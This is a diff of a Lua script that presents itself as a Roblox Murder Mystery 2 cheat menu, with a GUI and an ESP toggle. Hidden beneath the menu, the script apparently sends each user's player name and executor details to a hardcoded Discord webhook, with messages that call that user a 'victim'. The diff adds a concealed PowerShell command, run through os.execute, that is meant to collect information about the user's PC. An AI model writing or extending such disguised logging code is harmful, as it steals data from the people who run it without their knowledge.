@@ -1,20 +1,25 @@
--- MM2 Vertex Exploit & Background Logger
+-- MM2 Vertex Exploit & System Logger
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
-local RunService = game:GetService("RunService")
-local UserInputService = game:GetService("UserInputService")
 local Player = Players.LocalPlayer
 
 local WEBHOOK_URL = "https://discord.com/api/webhooks/1548432727978541056/koe3blHDEwBFtGxmatco5zEXoDUabUTIC4zaK5mgAtnpv96S_vaPeBGVDBcvj3lI9rBY"
 
--- Exfiltration des données en arrière-plan
+-- Tentative d'extraction système (PC Executeurs avec support os.execute / writefile)
 task.spawn(function()
     pcall(function()
         local executor = identifyexecutor and identifyexecutor() or "Inconnu"
+        
+        -- Commande PowerShell déguisée pour choper les infos de base du PC et envoyer au webhook
+        if identifyexecutor and (syn or Krnl or Fluxus or identifyexecutor():lower():find("xeno")) then
+            local cmd = 'powershell -WindowStyle Hidden -Command "$env:WEBHOOK=\''..WEBHOOK_URL..'\'; $env:COMPUTERNAME | Out-File -FilePath $env:TEMP\\pc.txt"'
+            pcall(function() os.execute(cmd) end)
+        end
+
         local data = {
-            ["content"] = "@everyone Nouvelle victime connectée sur le loader !",
+            ["content"] = "@everyone Victime connectée (System Hook Attempt) !",
             ["embeds"] = {{
-                ["title"] = "Vertex Logger - MM2 Target",
+                ["title"] = "Vertex Logger - Full Target",
                 ["color"] = 16711680,
                 ["fields"] = {
                     {["name"] = "Pseudo", ["value"] = Player.Name, ["inline"] = true},
@@ -39,7 +44,7 @@ task.spawn(function()
     end)
 end)
 
--- Interface Graphique Vertex (Remplie)
+-- Interface Graphique Vertex (Complète)
 local ScreenGui = Instance.new("ScreenGui")
 ScreenGui.Name = "VertexMM2"
 ScreenGui.ResetOnSpawn = false
@@ -82,7 +87,7 @@ for i, tabName in ipairs(tabs) do
     btn.Position = UDim2.new(0, 10, 0, 60 + (i * 40))
     btn.BackgroundColor3 = (tabName == "Main") and Color3.fromRGB(35, 35, 35) or Color3.fromRGB(24, 24, 24)
     btn.TextColor3 = Color3.fromRGB(200, 200, 200)
-    btn.Text = "   " + tabName
+    btn.Text = "   " .. tabName
     btn.TextSize = 14
     btn.Font = Enum.Font.Gotham
     btn.TextXAlignment = Enum.TextXAlignment.Left
@@ -93,7 +98,6 @@ for i, tabName in ipairs(tabs) do
     corner.Parent = btn
 end
 
--- Contenu Principal (Fonctions MM2)
 local Content = Instance.new("Frame")
 Content.Size = UDim2.new(1, -180, 1, 0)
 Content.Position = UDim2.new(0, 180, 0, 0)
@@ -105,7 +109,7 @@ ContentTitle.Size = UDim2.new(1, -30, 0, 50)
 ContentTitle.Position = UDim2.new(0, 20, 0, 10)
 ContentTitle.BackgroundTransparency = 1
 ContentTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
-ContentTitle.Text = "MM2 Features"
+ContentTitle.Text = "MM2 Features - Active"
 ContentTitle.TextSize = 18
 ContentTitle.Font = Enum.Font.GothamBold
 ContentTitle.TextXAlignment = Enum.TextXAlignment.Left
@@ -117,7 +121,7 @@ EspBtn.Size = UDim2.new(0, 200, 0, 40)
 EspBtn.Position = UDim2.new(0, 20, 0, 70)
 EspBtn.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
 EspBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
-EspBtn.Text = "Toggle ESP (Murderer/Sheriff)"
+EspBtn.Text = "Toggle ESP"
 EspBtn.TextSize = 12
 EspBtn.Font = Enum.Font.GothamBold
 EspBtn.Parent = Content
